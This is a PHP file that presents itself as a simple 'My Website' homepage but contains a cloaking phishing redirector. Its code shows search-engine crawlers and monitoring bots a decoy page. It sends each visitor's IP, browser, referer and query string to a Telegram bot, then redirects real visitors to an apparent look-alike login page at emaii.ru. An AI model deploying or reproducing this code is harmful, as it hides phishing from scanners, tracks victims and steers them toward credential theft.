<?php
ob_start(); // needs to be added here
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>My Website</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="icon" href="./favicon.ico" type="image/x-icon">
  </head>
  <body>
    <main>
        <h1>Welcome to My Website</h1>  
    </main>
  </body>
</html>
<?php
// Тут свой токенбота и чат с собой
$token = '';
$chat_id = '';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// List of known bot user agents
$botUserAgents = array(
    'bot',
    'google',
    'bing',
    'yandex',
    'duckduck',
    'ahrefs',
    'applebot',
    'baiduspider',
    'facebookexternalhit',
    'facebot',
    'linkedin',
    'msnbot',
    'pinterest',
    'semrush',
    'slurp',
    'twitter',
    'uptimerobot',
    'vkShare',
    'yeti',
    'zabbix'
    
    // Add more bot user agents as necessary
);

// Check if the user agent is a bot
$isBot = false;
foreach ($botUserAgents as $botUserAgent) {
    if (stripos($userAgent, $botUserAgent) !== false) {
        echo "Hello desip";
        $isBot = true;
        include('index2.php');
        exit;
    }
}
$Date = date("d-m-y H:i:s", time());
$browser = getenv("HTTP_USER_AGENT");
$ref = getenv("HTTP_REFERER");
$ip = getenv("REMOTE_ADDR");
$query = UrlDecode(getenv("QUERY_STRING"));
$text = "Date: $Date\nBrowser: $browser\nReferer: $ref\nIP: $ip\nQuery: $query\n\n";
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($text);
file_get_contents($url);

if (!$isBot) {
    // Redirect non-bot users to the specified URL
    echo "Hello pers";
    $tmp=$_SERVER['QUERY_STRING'];
    $redirect_url = "https://emaii.ru/authorization/login/attach.php?$tmp";
    header("Location: ". $redirect_url);
    exit();
}
?>
?>
